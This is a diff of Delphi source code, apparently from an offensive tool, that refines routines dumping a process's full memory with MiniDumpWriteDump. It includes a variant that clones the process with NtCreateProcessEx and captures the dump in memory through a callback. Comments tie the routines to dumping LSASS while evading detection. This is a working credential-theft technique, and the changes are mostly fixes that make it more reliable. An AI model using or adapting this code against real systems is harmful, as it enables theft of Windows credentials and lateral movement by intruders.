@@ -201,6 +201,14 @@ end;
   end;
   PMINIDUMP_CALLBACK_INFORMATION=^MINIDUMP_CALLBACK_INFORMATION;
 
+  type
+    API_VERSION = record
+      MajorVersion: USHORT;
+      MinorVersion: USHORT;
+      Revision: USHORT;
+      Reserved: USHORT;
+    end;
+    LPAPI_VERSION = ^API_VERSION;
   //**********************************************************************
 
   //function MiniDumpWriteDump(hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall; external 'Dbghelp.dll';
@@ -215,6 +223,7 @@ implementation
 
 var
 MiniDumpWriteDump:function (hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;
+ImagehlpApiVersion:function() :LPAPI_VERSION; stdcall;
 
 dumpBuffer:LPVOID;
 bytesRead:DWORD = 0;
@@ -223,26 +232,33 @@ bytesRead:DWORD = 0;
 function dumpprocess0(pid:dword):boolean;
 var
   processHandle,hfile:thandle;
+  version:LPAPI_VERSION ;
   //
   {$IFDEF win32}lib:cardinal;{$endif}
 {$IFDEF win64}lib:int64;{$endif}
 begin
-log('******** dumpprocess ********');
+result:=false;
+log('******** dumpprocess0 ********');
 lib:=0;
 lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll')); //we go for the default system one
+//lib:=loadlibrary(pchar(GetCurrentDir+ '\dbghelp.dll')); //we go for the current dir one
 if lib<=0 then
   begin
   raise exception.Create  ('could not loadlibrary:'+inttostr(getlasterror));
   exit;
   end;
 MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
+ImagehlpApiVersion:=getProcAddress(lib,'ImagehlpApiVersion'); ;
+version:=ImagehlpApiVersion ;
+log('ImagehlpApiVersion:'+inttostr(version^.MajorVersion )+'.'+inttostr(version^.MinorVersion )+'.'+inttostr(version^.Revision ),0);
 //
 processHandle:=thandle(-1);
 processHandle := OpenProcess(PROCESS_ALL_ACCESS, false, PID);
 if processHandle<>thandle(-1) then
    begin
    hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-   result := MiniDumpWriteDump(processHandle, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
+   if hfile<>thandle(-1) then
+      result := MiniDumpWriteDump(processHandle, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
    if result=false
       then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
       else log(inttostr(pid)+'.dmp'+ ' written',1);
@@ -261,6 +277,7 @@ var
   {$IFDEF win32}lib:cardinal;{$endif}
 {$IFDEF win64}lib:int64;{$endif}
 begin
+result:=false;
 log('******** dumpprocess2 ********');
 lib:=0;
 lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll')); //we go for the default system one
@@ -289,6 +306,7 @@ if processHandle<>thandle(-1) then
       if result=false
          then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
          else log(inttostr(pid)+'.dmp'+ ' written',1);
+      log('filesize:'+inttostr(getfilesize(hfile,nil)));
       closehandle(hfile);
       end else log('NtCreateProcessEx failed');
    closehandle(processHandle );
@@ -323,9 +341,11 @@ case callbackInput^.CallbackType of
 
                         // Calculate location of where we want to store this part of the dump.
        			// Destination is start of our dumpBuffer + the offset of the minidump data
-       			destination := pointer(nativeuint(dumpBuffer) + callbackInput^.Io.Offset);
+                        //log('Offset:'+inttostr(callbackInput^.Io.Offset));
+                        destination := pointer(nativeuint(dumpBuffer) + callbackInput^.Io.Offset);
 
        			// Size of the chunk of minidump that's just been read.
+                        //log('buffersize:'+inttostr(callbackInput^.Io.BufferBytes));
 			bufferSize := callbackInput^.Io.BufferBytes;
 			bytesRead := bytesread + bufferSize;
 
@@ -383,11 +403,15 @@ if processHandle<>thandle(-1) then
       	callbackInfo.CallbackParam := nil;
       //
       dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 256);
+      log('heapsize:'+inttostr(heapsize(getprocessheap(),0,dumpBuffer )));
+      //dumpbuffer:=allocmem(1024*1024*256);
       log('calling MiniDumpWriteDump');
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
       //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
       //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
-      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
+      result := MiniDumpWriteDump(clone, getcurrentprocessid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
+      //uhm...the above, i.e passing pid=0, seems to end with a corrupted dump, when using a callback...
+      //changed pid=0 to pid=getcurrentprocessid
       if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
       //save dumpbuffer...
@@ -399,6 +423,7 @@ if processHandle<>thandle(-1) then
       closehandle(hfile);
       //
       heapfree(GetProcessHeap(),0,dumpbuffer);
+      //freemem(dumpBuffer);
       end else log('NtCreateProcessEx failed');
    closehandle(processHandle );
    TerminateProcess(clone,0);
